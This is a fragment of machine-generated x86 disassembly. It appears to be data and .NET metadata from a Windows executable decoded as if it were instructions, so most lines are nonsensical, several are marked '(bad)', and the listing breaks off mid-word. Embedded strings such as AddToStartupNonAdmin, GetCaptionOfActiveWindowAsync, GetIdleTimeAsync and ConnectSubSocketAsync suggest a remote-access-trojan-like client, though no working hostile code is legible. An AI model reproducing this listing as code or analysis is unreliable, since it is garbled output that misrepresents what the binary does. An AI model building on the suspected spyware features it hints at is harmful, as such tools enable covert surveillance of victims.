  408f37:	0c 9d                	or     $0x9d,%al
  408f39:	0c c0                	or     $0xc0,%al
  408f3b:	0c c4                	or     $0xc4,%al
  408f3d:	0c d5                	or     $0xd5,%al
  408f3f:	0c e5                	or     $0xe5,%al
  408f41:	0c ef                	or     $0xef,%al
  408f43:	0c 84                	or     $0x84,%al
  408f45:	0d dd 0d fa 0d       	or     $0xdfa0ddd,%eax
  408f4a:	12 0e                	adc    (%esi),%cl
  408f4c:	4c                   	dec    %esp
  408f4d:	0e                   	push   %cs
  408f4e:	56                   	push   %esi
  408f4f:	0e                   	push   %cs
  408f50:	95                   	xchg   %eax,%ebp
  408f51:	0e                   	push   %cs
  408f52:	9a 0e ac 0e b6 0e c0 	lcall  $0xc00e,$0xb60eac0e
  408f59:	0e                   	push   %cs
  408f5a:	0e                   	push   %cs
  408f5b:	0f                   	movmskps (bad),%ecx
  408f5c:	50                   	push   %eax
  408f5d:	0f 76 0f             	pcmpeqd (%edi),%mm1
  408f60:	98                   	cwtl
  408f61:	0f b2 0f             	lss    (%edi),%ecx
  408f64:	c4 0f                	les    (%edi),%ecx
  408f66:	c9                   	leave
  408f67:	0f 44 10             	cmove  (%eax),%edx
  408f6a:	56                   	push   %esi
  408f6b:	10 70 10             	adc    %dh,0x10(%eax)
  408f6e:	9d                   	popf
  408f6f:	10 ad 10 c5 10 dd    	adc    %ch,-0x22ef3af0(%ebp)
  408f75:	10 e9                	adc    %ch,%cl
  408f77:	10 f5                	adc    %dh,%ch
  408f79:	10 01                	adc    %al,(%ecx)
  408f7b:	11 0d 11 19 11 2b    	adc    %ecx,0x2b111911
  408f81:	11 3e                	adc    %edi,(%esi)
  408f83:	11 6b 11             	adc    %ebp,0x11(%ebx)
  408f86:	83 11 da             	adcl   $0xffffffda,(%ecx)
  408f89:	11 0f                	adc    %ecx,(%edi)
  408f8b:	12 1d 12 3a 12 57    	adc    0x57123a12,%bl
  408f91:	12 1e                	adc    (%esi),%bl
  408f93:	00 01                	add    %al,(%ecx)
  408f95:	00 00                	add    %al,(%eax)
  408f97:	00 a9 0d 0c 02 02    	add    %ch,0x2020c0d(%ecx)
  408f9d:	00 62 00             	add    %ah,0x0(%edx)
  408fa0:	03 00                	add    (%eax),%eax
  408fa2:	04 00                	add    $0x0,%al
  408fa4:	18 00                	sbb    %al,(%eax)
  408fa6:	03 00                	add    (%eax),%eax
  408fa8:	04 00                	add    $0x0,%al
  408faa:	1a 00                	sbb    (%eax),%al
  408fac:	05 00 07 00 36       	add    $0x36000700,%eax
  408fb1:	00 03                	add    %al,(%ebx)
  408fb3:	00 07                	add    %al,(%edi)
  408fb5:	00 38                	add    %bh,(%eax)
  408fb7:	00 05 00 08 00 3a    	add    %al,0x3a000800
  408fbd:	00 03                	add    %al,(%ebx)
  408fbf:	00 08                	add    %cl,(%eax)
  408fc1:	00 3c 00             	add    %bh,(%eax,%eax,1)
  408fc4:	05 00 09 00 3e       	add    $0x3e000900,%eax
  408fc9:	00 03                	add    %al,(%ebx)
  408fcb:	00 09                	add    %cl,(%ecx)
  408fcd:	00 40 00             	add    %al,0x0(%eax)
  408fd0:	05 00 0a 00 42       	add    $0x42000a00,%eax
  408fd5:	00 03                	add    %al,(%ebx)
  408fd7:	00 0a                	add    %cl,(%edx)
  408fd9:	00 44 00 05          	add    %al,0x5(%eax,%eax,1)
  408fdd:	00 0b                	add    %cl,(%ebx)
  408fdf:	00 46 00             	add    %al,0x0(%esi)
  408fe2:	03 00                	add    (%eax),%eax
  408fe4:	0b 00                	or     (%eax),%eax
  408fe6:	48                   	dec    %eax
  408fe7:	00 05 00 0c 00 4a    	add    %al,0x4a000c00
  408fed:	00 03                	add    %al,(%ebx)
  408fef:	00 0c 00             	add    %cl,(%eax,%eax,1)
  408ff2:	4c                   	dec    %esp
  408ff3:	00 05 00 0d 00 4e    	add    %al,0x4e000d00
  408ff9:	00 03                	add    %al,(%ebx)
  408ffb:	00 0d 00 50 00 05    	add    %cl,0x5005000
  409001:	00 0e                	add    %cl,(%esi)
  409003:	00 52 00             	add    %dl,0x0(%edx)
  409006:	03 00                	add    (%eax),%eax
  409008:	0e                   	push   %cs
  409009:	00 54 00 05          	add    %dl,0x5(%eax,%eax,1)
  40900d:	00 10                	add    %dl,(%eax)
  40900f:	00 6e 00             	add    %ch,0x0(%esi)
  409012:	03 00                	add    (%eax),%eax
  409014:	10 00                	adc    %al,(%eax)
  409016:	70 00                	jo     0x409018
  409018:	05 00 11 00 72       	add    $0x72001100,%eax
  40901d:	00 03                	add    %al,(%ebx)
  40901f:	00 11                	add    %dl,(%ecx)
  409021:	00 74 00 05          	add    %dh,0x5(%eax,%eax,1)
  409025:	00 12                	add    %dl,(%edx)
  409027:	00 76 00             	add    %dh,0x0(%esi)
  40902a:	03 00                	add    (%eax),%eax
  40902c:	12 00                	adc    (%eax),%al
  40902e:	78 00                	js     0x409030
  409030:	05 00 13 00 7a       	add    $0x7a001300,%eax
  409035:	00 03                	add    %al,(%ebx)
  409037:	00 13                	add    %dl,(%ebx)
  409039:	00 7c 00 05          	add    %bh,0x5(%eax,%eax,1)
  40903d:	00 14 00             	add    %dl,(%eax,%eax,1)
  409040:	7e 00                	jle    0x409042
  409042:	03 00                	add    (%eax),%eax
  409044:	14 00                	adc    $0x0,%al
  409046:	80 00 05             	addb   $0x5,(%eax)
  409049:	00 17                	add    %dl,(%edi)
  40904b:	00 9c 00 03 00 17 00 	add    %bl,0x170003(%eax,%eax,1)
  409052:	9e                   	sahf
  409053:	00 05 00 18 00 a0    	add    %al,0xa0001800
  409059:	00 03                	add    %al,(%ebx)
  40905b:	00 18                	add    %bl,(%eax)
  40905d:	00 a2 00 05 00 1a    	add    %ah,0x1a000500(%edx)
  409063:	00 aa 00 03 00 1a    	add    %ch,0x1a000300(%edx)
  409069:	00 ac 00 05 00 1b 00 	add    %ch,0x1b0005(%eax,%eax,1)
  409070:	ae                   	scas   %es:(%edi),%al
  409071:	00 03                	add    %al,(%ebx)
  409073:	00 1b                	add    %bl,(%ebx)
  409075:	00 b0 00 05 00 1d    	add    %dh,0x1d000500(%eax)
  40907b:	00 be 00 03 00 1d    	add    %bh,0x1d000300(%esi)
  409081:	00 c0                	add    %al,%al
  409083:	00 05 00 22 00 02    	add    %al,0x2002200
  409089:	01 03                	add    %eax,(%ebx)
  40908b:	00 22                	add    %ah,(%edx)
  40908d:	00 04 01             	add    %al,(%ecx,%eax,1)
  409090:	05 00 23 00 06       	add    $0x6002300,%eax
  409095:	01 03                	add    %eax,(%ebx)
  409097:	00 23                	add    %ah,(%ebx)
  409099:	00 08                	add    %cl,(%eax)
  40909b:	01 05 00 25 00 0e    	add    %eax,0xe002500
  4090a1:	01 03                	add    %eax,(%ebx)
  4090a3:	00 25 00 10 01 05    	add    %ah,0x5011000
  4090a9:	00 26                	add    %ah,(%esi)
  4090ab:	00 12                	add    %dl,(%edx)
  4090ad:	01 03                	add    %eax,(%ebx)
  4090af:	00 26                	add    %ah,(%esi)
  4090b1:	00 14 01             	add    %dl,(%ecx,%eax,1)
  4090b4:	05 00 28 00 1a       	add    $0x1a002800,%eax
  4090b9:	01 03                	add    %eax,(%ebx)
  4090bb:	00 28                	add    %ch,(%eax)
  4090bd:	00 1c 01             	add    %bl,(%ecx,%eax,1)
  4090c0:	05 00 29 00 1e       	add    $0x1e002900,%eax
  4090c5:	01 03                	add    %eax,(%ebx)
  4090c7:	00 29                	add    %ch,(%ecx)
  4090c9:	00 20                	add    %ah,(%eax)
  4090cb:	01 05 00 2a 00 22    	add    %eax,0x22002a00
  4090d1:	01 03                	add    %eax,(%ebx)
  4090d3:	00 2a                	add    %ch,(%edx)
  4090d5:	00 24 01             	add    %ah,(%ecx,%eax,1)
  4090d8:	05 00 62 0f 33       	add    $0x330f6200,%eax
  4090dd:	0f 6c                	(bad)
  4090df:	0f 40 0f             	cmovo  (%edi),%ecx
  4090e2:	57                   	push   %edi
  4090e3:	0f 4c 0f             	cmovl  (%edi),%ecx
  4090e6:	2e 09 88 09 98 09 d0 	or     %ecx,%cs:-0x2ff667f7(%eax)
  4090ed:	09 d6                	or     %edx,%esi
  4090ef:	09 e5                	or     %esp,%ebp
  4090f1:	0a ec                	or     %ah,%ch
  4090f3:	0a f3                	or     %bl,%dh
  4090f5:	0a 44 0c 4a          	or     0x4a(%esp,%ecx,1),%al
  4090f9:	0c 5a                	or     $0x5a,%al
  4090fb:	0c 60                	or     $0x60,%al
  4090fd:	0c 81                	or     $0x81,%al
  4090ff:	0c a2                	or     $0xa2,%al
  409101:	0c c9                	or     $0xc9,%al
  409103:	0c da                	or     $0xda,%al
  409105:	0c 17                	or     $0x17,%al
  409107:	0d 2c 0d 7c 0d       	or     $0xd7c0d2c,%eax
  40910c:	60                   	pusha
  40910d:	0e                   	push   %cs
  40910e:	67 0e                	addr16 push %cs
  409110:	d5 0e                	aad    $0xe
  409112:	f8                   	clc
  409113:	0e                   	push   %cs
  409114:	fe 0e                	decb   (%esi)
  409116:	4a                   	dec    %edx
  409117:	10 80 10 1f 11 4a    	adc    %al,0x4a111f10(%eax)
  40911d:	11 29                	adc    %ebp,(%ecx)
  40911f:	12 63 12             	adc    0x12(%ebx),%ah
  409122:	00 01                	add    %al,(%ecx)
  409124:	03 00                	add    (%eax),%eax
  409126:	e3 0c                	jecxz  0x409134
  409128:	01 00                	add    %eax,(%eax)
  40912a:	00 01                	add    %al,(%ecx)
  40912c:	05 00 62 13 01       	add    $0x1136200,%eax
  409131:	00 00                	add    %al,(%eax)
  409133:	01 07                	add    %eax,(%edi)
  409135:	00 50 13             	add    %dl,0x13(%eax)
  409138:	01 00                	add    %eax,(%eax)
  40913a:	46                   	inc    %esi
  40913b:	01 09                	add    %ecx,(%ecx)
  40913d:	00 2c 07             	add    %ch,(%edi,%eax,1)
  409140:	02 00                	add    (%eax),%al
  409142:	40                   	inc    %eax
  409143:	01 0b                	add    %ecx,(%ebx)
  409145:	00 36                	add    %dh,(%esi)
  409147:	08 02                	or     %al,(%edx)
  409149:	00 00                	add    %al,(%eax)
  40914b:	02 57 00             	add    0x0(%edi),%dl
  40914e:	01 12                	add    %edx,(%edx)
  409150:	03 00                	add    (%eax),%eax
  409152:	40                   	inc    %eax
  409153:	01 cf                	add    %ecx,%edi
  409155:	00 3e                	add    %bh,(%esi)
  409157:	10 04 00             	adc    %al,(%eax,%eax,1)
  40915a:	46                   	inc    %esi
  40915b:	01 d1                	add    %edx,%ecx
  40915d:	00 b7 19 05 00 46    	add    %dh,0x46000519(%edi)
  409163:	01 d3                	add    %edx,%ebx
  409165:	00 85 19 05 00 46    	add    %al,0x46000519(%ebp)
  40916b:	01 d5                	add    %edx,%ebp
  40916d:	00 9d 0e 05 00 00    	add    %bl,0x50e(%ebp)
  409173:	01 d7                	add    %edx,%edi
  409175:	00 37                	add    %dh,(%edi)
  409177:	07                   	pop    %es
  409178:	05 00 00 01 d9       	add    $0xd9010000,%eax
  40917d:	00 ce                	add    %cl,%dh
  40917f:	11 06                	adc    %eax,(%esi)
  409181:	00 00                	add    %al,(%eax)
  409183:	01 db                	add    %ebx,%ebx
  409185:	00 8b 08 05 00 50    	add    %cl,0x50000508(%ebx)
  40918b:	20 00                	and    %al,(%eax)
  40918d:	00 cf                	add    %cl,%bh
  40918f:	00 58 20             	add    %bl,0x20(%eax)
  409192:	00 00                	add    %al,(%eax)
  409194:	d0 00                	rolb   $1,(%eax)
  409196:	04 80                	add    $0x80,%al
  409198:	00 00                	add    %al,(%eax)
  40919a:	01 00                	add    %eax,(%eax)
	...
  4091a8:	cf                   	iret
  4091a9:	17                   	pop    %ss
  4091aa:	00 00                	add    %al,(%eax)
  4091ac:	04 00                	add    $0x0,%al
	...
  4091b6:	00 00                	add    %al,(%eax)
  4091b8:	01 00                	add    %eax,(%eax)
  4091ba:	6c                   	insb   (%dx),%es:(%edi)
  4091bb:	06                   	push   %es
  4091bc:	00 00                	add    %al,(%eax)
  4091be:	00 00                	add    %al,(%eax)
  4091c0:	04 00                	add    $0x0,%al
	...
  4091ca:	00 00                	add    %al,(%eax)
  4091cc:	01 00                	add    %eax,(%eax)
  4091ce:	be 0f 00 00 00       	mov    $0xf,%esi
  4091d3:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4091de:	00 00                	add    %al,(%eax)
  4091e0:	01 00                	add    %eax,(%eax)
  4091e2:	f6 09 00             	testb  $0x0,(%ecx)
  4091e5:	00 00                	add    %al,(%eax)
  4091e7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4091f2:	00 00                	add    %al,(%eax)
  4091f4:	67 10 ef             	addr16 adc %ch,%bh
  4091f7:	17                   	pop    %ss
  4091f8:	00 00                	add    %al,(%eax)
  4091fa:	00 00                	add    %al,(%eax)
  4091fc:	04 00                	add    $0x0,%al
  4091fe:	03 00                	add    (%eax),%eax
  409200:	07                   	pop    %es
  409201:	00 06                	add    %al,(%esi)
  409203:	00 08                	add    %cl,(%eax)
  409205:	00 06                	add    %al,(%esi)
  409207:	00 09                	add    %cl,(%ecx)
  409209:	00 06                	add    %al,(%esi)
  40920b:	00 0a                	add    %cl,(%edx)
  40920d:	00 06                	add    %al,(%esi)
  40920f:	00 0b                	add    %cl,(%ebx)
  409211:	00 06                	add    %al,(%esi)
  409213:	00 0c 00             	add    %cl,(%eax,%eax,1)
  409216:	06                   	push   %es
  409217:	00 0d 00 06 00 0e    	add    %cl,0xe000600
  40921d:	00 06                	add    %al,(%esi)
  40921f:	00 10                	add    %dl,(%eax)
  409221:	00 0f                	add    %cl,(%edi)
  409223:	00 11                	add    %dl,(%ecx)
  409225:	00 0f                	add    %cl,(%edi)
  409227:	00 12                	add    %dl,(%edx)
  409229:	00 0f                	add    %cl,(%edi)
  40922b:	00 13                	add    %dl,(%ebx)
  40922d:	00 0f                	add    %cl,(%edi)
  40922f:	00 14 00             	add    %dl,(%eax,%eax,1)
  409232:	0f 00 17             	lldt   (%edi)
  409235:	00 16                	add    %dl,(%esi)
  409237:	00 18                	add    %bl,(%eax)
  409239:	00 16                	add    %dl,(%esi)
  40923b:	00 19                	add    %bl,(%ecx)
  40923d:	00 16                	add    %dl,(%esi)
  40923f:	00 1a                	add    %bl,(%edx)
  409241:	00 16                	add    %dl,(%esi)
  409243:	00 1b                	add    %bl,(%ebx)
  409245:	00 16                	add    %dl,(%esi)
  409247:	00 1d 00 1c 00 20    	add    %bl,0x20001c00
  40924d:	00 1f                	add    %bl,(%edi)
  40924f:	00 21                	add    %ah,(%ecx)
  409251:	00 1f                	add    %bl,(%edi)
  409253:	00 22                	add    %ah,(%edx)
  409255:	00 1f                	add    %bl,(%edi)
  409257:	00 23                	add    %ah,(%ebx)
  409259:	00 1f                	add    %bl,(%edi)
  40925b:	00 24 00             	add    %ah,(%eax,%eax,1)
  40925e:	1f                   	pop    %ds
  40925f:	00 25 00 1f 00 26    	add    %ah,0x26001f00
  409265:	00 1f                	add    %bl,(%edi)
  409267:	00 27                	add    %ah,(%edi)
  409269:	00 1f                	add    %bl,(%edi)
  40926b:	00 28                	add    %ch,(%eax)
  40926d:	00 1f                	add    %bl,(%edi)
  40926f:	00 29                	add    %ch,(%ecx)
  409271:	00 1f                	add    %bl,(%edi)
  409273:	00 2a                	add    %ch,(%edx)
  409275:	00 1f                	add    %bl,(%edi)
  409277:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40927a:	2b 00                	sub    (%eax),%eax
  40927c:	2d 00 2b 00 2b       	sub    $0x2b002b00,%eax
  409281:	00 24 09             	add    %ah,(%ecx,%ecx,1)
  409284:	39 00                	cmp    %eax,(%eax)
  409286:	5b                   	pop    %ebx
  409287:	09 4b 00             	or     %ecx,0x0(%ebx)
  40928a:	aa                   	stos   %al,%es:(%edi)
  40928b:	09 4b 00             	or     %ecx,0x0(%ebx)
  40928e:	dc 09                	fmull  (%ecx)
  409290:	4b                   	dec    %ebx
  409291:	00 2b                	add    %ch,(%ebx)
  409293:	0a 39                	or     (%ecx),%bh
  409295:	00 86 0a 39 00 90    	add    %al,-0x6fffc6f6(%esi)
  40929b:	0a 39                	or     (%ecx),%bh
  40929d:	00 9a 0a 39 00 a4    	add    %bl,-0x5bffc6f6(%edx)
  4092a3:	0a 39                	or     (%ecx),%bh
  4092a5:	00 ae 0a 39 00 b8    	add    %ch,-0x47ffc6f6(%esi)
  4092ab:	0a 39                	or     (%ecx),%bh
  4092ad:	00 c2                	add    %al,%dl
  4092af:	0a 39                	or     (%ecx),%bh
  4092b1:	00 cc                	add    %cl,%ah
  4092b3:	0a 4b 00             	or     0x0(%ebx),%cl
  4092b6:	fa                   	cli
  4092b7:	0a 4b 00             	or     0x0(%ebx),%cl
  4092ba:	05 0b 4b 00 2e       	add    $0x2e004b0b,%eax
  4092bf:	0b 4b 00             	or     0x0(%ebx),%ecx
  4092c2:	4b                   	dec    %ebx
  4092c3:	0b 4b 00             	or     0x0(%ebx),%ecx
  4092c6:	56                   	push   %esi
  4092c7:	0b 4b 00             	or     0x0(%ebx),%ecx
  4092ca:	85 0b                	test   %ecx,(%ebx)
  4092cc:	4b                   	dec    %ebx
  4092cd:	00 8c 0b 4b 00 97 0b 	add    %cl,0xb97004b(%ebx,%ecx,1)
  4092d4:	4b                   	dec    %ebx
  4092d5:	00 ae 0b 4b 00 b8    	add    %ch,-0x47ffb4f5(%esi)
  4092db:	0b 4b 00             	or     0x0(%ebx),%ecx
  4092de:	c3                   	ret
  4092df:	0b 4b 00             	or     0x0(%ebx),%ecx
  4092e2:	f0 0b bf 00 24 09 c1 	lock or -0x3ef6dc00(%edi),%edi
  4092e9:	00 24 09             	add    %ah,(%ecx,%ecx,1)
  4092ec:	c3                   	ret
  4092ed:	00 25 0c 4b 00 50    	add    %ah,0x50004b0c
  4092f3:	0c 4b                	or     $0x4b,%al
  4092f5:	00 66 0c             	add    %ah,0xc(%esi)
  4092f8:	4b                   	dec    %ebx
  4092f9:	00 77 0c             	add    %dh,0xc(%edi)
  4092fc:	df 00                	filds  (%eax)
  4092fe:	98                   	cwtl
  4092ff:	0c e3                	or     $0xe3,%al
  409301:	00 b2 0c eb 00 d0    	add    %dh,-0x2fff14f4(%edx)
  409307:	0c f1                	or     $0xf1,%al
  409309:	00 e0                	add    %ah,%al
  40930b:	0c f1                	or     $0xf1,%al
  40930d:	00 ea                	add    %ch,%dl
  40930f:	0c ff                	or     $0xff,%al
  409311:	00 52 0d             	add    %dl,0xd(%edx)
  409314:	01 01                	add    %eax,(%ecx)
  409316:	56                   	push   %esi
  409317:	0d 07 01 6d 0d       	or     $0xd6d0107,%eax
  40931c:	1f                   	pop    %ds
  40931d:	01 c1                	add    %eax,%ecx
  40931f:	0d 1f 01 c8 0d       	or     $0xdc8011f,%eax
  409324:	1f                   	pop    %ds
  409325:	01 d3                	add    %edx,%ebx
  409327:	0d 27 01 ef 0d       	or     $0xdef0127,%eax
  40932c:	2f                   	das
  40932d:	01 08                	add    %ecx,(%eax)
  40932f:	0e                   	push   %cs
  409330:	2f                   	das
  409331:	01 37                	add    %esi,(%edi)
  409333:	0e                   	push   %cs
  409334:	2f                   	das
  409335:	01 42 0e             	add    %eax,0xe(%edx)
  409338:	eb 00                	jmp    0x40933a
  40933a:	51                   	push   %ecx
  40933b:	0e                   	push   %cs
  40933c:	eb 00                	jmp    0x40933e
  40933e:	5b                   	pop    %ebx
  40933f:	0e                   	push   %cs
  409340:	41                   	inc    %ecx
  409341:	01 8f 0e f1 00 b1    	add    %ecx,-0x4eff0ef2(%edi)
  409347:	0e                   	push   %cs
  409348:	eb 00                	jmp    0x40934a
  40934a:	bb 0e 27 01 04       	mov    $0x401270e,%ebx
  40934f:	0f 27                	(bad)
  409351:	01 2a                	add    %ebp,(%edx)
  409353:	0f 27                	(bad)
  409355:	01 49 0f             	add    %ecx,0xf(%ecx)
  409358:	2f                   	das
  409359:	01 6c 0f 27          	add    %ebp,0x27(%edi,%ecx,1)
  40935d:	01 8d 0f 39 00 a8    	add    %ecx,-0x57ffc6f1(%ebp)
  409363:	0f 4b 00             	cmovnp (%eax),%eax
  409366:	0e                   	push   %cs
  409367:	10 4b 00             	adc    %cl,0x0(%ebx)
  40936a:	15 10 4b 00 28       	adc    $0x28004b10,%eax
  40936f:	10 9f 01 50 10 e3    	adc    %bl,-0x1cefafff(%edi)
  409375:	00 e3                	add    %ah,%bl
  409377:	10 39                	adc    %bh,(%ecx)
  409379:	00 ef                	add    %ch,%bh
  40937b:	10 39                	adc    %bh,(%ecx)
  40937d:	00 fb                	add    %bh,%bl
  40937f:	10 f1                	adc    %dh,%cl
  409381:	00 07                	add    %al,(%edi)
  409383:	11 f1                	adc    %esi,%ecx
  409385:	00 13                	add    %dl,(%ebx)
  409387:	11 e9                	adc    %ebp,%ecx
  409389:	01 25 11 ed 01 38    	add    %esp,0x3801ed11
  40938f:	11 f3                	adc    %esi,%ebx
  409391:	01 25 0c f5 01 60    	add    %esp,0x6001f50c
  409397:	11 1f                	adc    %ebx,(%edi)
  409399:	01 78 11             	add    %edi,0x11(%eax)
  40939c:	07                   	pop    %es
  40939d:	01 25 0c 4b 00 ea    	add    %esp,0xea004b0c
  4093a3:	11 4b 00             	adc    %ecx,0x0(%ebx)
  4093a6:	f2 11 f3             	repnz adc %esi,%ebx
  4093a9:	01 52 0d             	add    %edx,0xd(%edx)
  4093ac:	2f                   	das
  4093ad:	01 2f                	add    %ebp,(%edi)
  4093af:	12 2f                	adc    (%edi),%ch
  4093b1:	01 4a 12             	add    %ecx,0x12(%edx)
  4093b4:	f3 01 69 12          	repz add %ebp,0x12(%ecx)
  4093b8:	43                   	inc    %ebx
  4093b9:	02 6d 12             	add    0x12(%ebp),%ch
  4093bc:	00 3c 52             	add    %bh,(%edx,%edx,2)
  4093bf:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  4093c3:	76 65                	jbe    0x40942a
  4093c5:	41                   	inc    %ecx
  4093c6:	73 79                	jae    0x409441
  4093c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4093c9:	63 3e                	arpl   %edi,(%esi)
  4093cb:	64 5f                	fs pop %edi
  4093cd:	5f                   	pop    %edi
  4093ce:	31 30                	xor    %esi,(%eax)
  4093d0:	00 3c 44             	add    %bh,(%esp,%eax,2)
  4093d3:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  4093da:	63 74 3e 64          	arpl   %esi,0x64(%esi,%edi,1)
  4093de:	5f                   	pop    %edi
  4093df:	5f                   	pop    %edi
  4093e0:	31 30                	xor    %esi,(%eax)
  4093e2:	00 3c 44             	add    %bh,(%esp,%eax,2)
  4093e5:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4093e9:	4d                   	dec    %ebp
  4093ea:	65 6e                	outsb  %gs:(%esi),(%dx)
  4093ec:	75 3e                	jne    0x40942c
  4093ee:	64 5f                	fs pop %edi
  4093f0:	5f                   	pop    %edi
  4093f1:	31 30                	xor    %esi,(%eax)
  4093f3:	00 3c 47             	add    %bh,(%edi,%eax,2)
  4093f6:	65 74 49             	gs je  0x409442
  4093f9:	64 6c                	fs insb (%dx),%es:(%edi)
  4093fb:	65 54                	gs push %esp
  4093fd:	69 6d 65 41 73 79 6e 	imul   $0x6e797341,0x65(%ebp),%ebp
  409404:	63 3e                	arpl   %edi,(%esi)
  409406:	64 5f                	fs pop %edi
  409408:	5f                   	pop    %edi
  409409:	32 30                	xor    (%eax),%dh
  40940b:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40940e:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  409411:	32 30                	xor    (%eax),%dh
  409413:	5f                   	pop    %edi
  409414:	30 00                	xor    %al,(%eax)
  409416:	3c 47                	cmp    $0x47,%al
  409418:	65 74 49             	gs je  0x409464
  40941b:	64 6c                	fs insb (%dx),%es:(%edi)
  40941d:	65 54                	gs push %esp
  40941f:	69 6d 65 41 73 79 6e 	imul   $0x6e797341,0x65(%ebp),%ebp
  409426:	63 3e                	arpl   %edi,(%esi)
  409428:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40942b:	32 30                	xor    (%eax),%dh
  40942d:	5f                   	pop    %edi
  40942e:	30 00                	xor    %al,(%eax)
  409430:	3c 3e                	cmp    $0x3e,%al
  409432:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  409435:	44                   	inc    %esp
  409436:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40943d:	6c                   	insb   (%dx),%es:(%edi)
  40943e:	61                   	popa
  40943f:	73 73                	jae    0x4094b4
  409441:	31 36                	xor    %esi,(%esi)
  409443:	5f                   	pop    %edi
  409444:	30 00                	xor    %al,(%eax)
  409446:	3c 3e                	cmp    $0x3e,%al
  409448:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  40944b:	36 5f                	ss pop %edi
  40944d:	30 00                	xor    %al,(%eax)
  40944f:	3c 43                	cmp    $0x43,%al
  409451:	6f                   	outsl  %ds:(%esi),(%dx)
  409452:	6e                   	outsb  %ds:(%esi),(%dx)
  409453:	63 61 74             	arpl   %esp,0x74(%ecx)
  409456:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40945a:	36 5f                	ss pop %edi
  40945c:	30 00                	xor    %al,(%eax)
  40945e:	3c 3e                	cmp    $0x3e,%al
  409460:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  409463:	44                   	inc    %esp
  409464:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40946b:	6c                   	insb   (%dx),%es:(%edi)
  40946c:	61                   	popa
  40946d:	73 73                	jae    0x4094e2
  40946f:	31 38                	xor    %edi,(%eax)
  409471:	5f                   	pop    %edi
  409472:	30 00                	xor    %al,(%eax)
  409474:	3c 3e                	cmp    $0x3e,%al
  409476:	39 5f 5f             	cmp    %ebx,0x5f(%edi)
  409479:	38 5f 30             	cmp    %bl,0x30(%edi)
  40947c:	00 3c 47             	add    %bh,(%edi,%eax,2)
  40947f:	65 74 43             	gs je  0x4094c5
  409482:	61                   	popa
  409483:	70 74                	jo     0x4094f9
  409485:	69 6f 6e 4f 66 41 63 	imul   $0x6341664f,0x6e(%edi),%ebp
  40948c:	74 69                	je     0x4094f7
  40948e:	76 65                	jbe    0x4094f5
  409490:	57                   	push   %edi
  409491:	69 6e 64 6f 77 41 73 	imul   $0x7341776f,0x64(%esi),%ebp
  409498:	79 6e                	jns    0x409508
  40949a:	63 3e                	arpl   %edi,(%esi)
  40949c:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40949f:	38 5f 30             	cmp    %bl,0x30(%edi)
  4094a2:	00 3c 41             	add    %bh,(%ecx,%eax,2)
  4094a5:	64 64 54             	fs fs push %esp
  4094a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4094a9:	53                   	push   %ebx
  4094aa:	74 61                	je     0x40950d
  4094ac:	72 74                	jb     0x409522
  4094ae:	75 70                	jne    0x409520
  4094b0:	4e                   	dec    %esi
  4094b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4094b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4094b3:	41                   	inc    %ecx
  4094b4:	64 6d                	fs insl (%dx),%es:(%edi)
  4094b6:	69 6e 3e 62 5f 5f 30 	imul   $0x305f5f62,0x3e(%esi),%ebp
  4094bd:	00 3c 52             	add    %bh,(%edx,%edx,2)
  4094c0:	65 6d                	gs insl (%dx),%es:(%edi)
  4094c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4094c3:	76 65                	jbe    0x40952a
  4094c5:	53                   	push   %ebx
  4094c6:	74 61                	je     0x409529
  4094c8:	72 74                	jb     0x40953e
  4094ca:	75 70                	jne    0x40953c
  4094cc:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  4094d0:	30 00                	xor    %al,(%eax)
  4094d2:	54                   	push   %esp
  4094d3:	79 70                	jns    0x409545
  4094d5:	65 30 00             	xor    %al,%gs:(%eax)
  4094d8:	3c 43                	cmp    $0x43,%al
  4094da:	6f                   	outsl  %ds:(%esi),(%dx)
  4094db:	6e                   	outsb  %ds:(%esi),(%dx)
  4094dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4094dd:	65 63 74 53 75       	arpl   %esi,%gs:0x75(%ebx,%edx,2)
  4094e2:	62 53 6f             	bound  %edx,0x6f(%ebx)
  4094e5:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  4094e8:	73 79                	jae    0x409563
  4094ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4094eb:	63 3e                	arpl   %edi,(%esi)
  4094ed:	64 5f                	fs pop %edi
  4094ef:	5f                   	pop    %edi
  4094f0:	31 31                	xor    %esi,(%ecx)
  4094f2:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  4094f9:	64 5f                	fs pop %edi
  4094fb:	5f                   	pop    %edi
  4094fc:	31 31                	xor    %esi,(%ecx)
  4094fe:	00 3c 53             	add    %bh,(%ebx,%edx,2)
  409501:	65 6e                	outsb  %gs:(%esi),(%dx)
  409503:	64 55                	fs push %ebp
  409505:	70 64                	jo     0x40956b
  409507:	61                   	popa
  409508:	74 65                	je     0x40956f
  40950a:	49                   	dec    %ecx
  40950b:	6e                   	outsb  %ds:(%esi),(%dx)
  40950c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40950e:	3e 64 5f             	ds fs pop %edi
  409511:	5f                   	pop    %edi
  409512:	31 31                	xor    %esi,(%ecx)
  409514:	00 43 4f             	add    %al,0x4f(%ebx)
  409517:	4d                   	dec    %ebp
  409518:	50                   	push   %eax
  409519:	52                   	push   %edx
  40951a:	45                   	inc    %ebp
  40951b:	53                   	push   %ebx
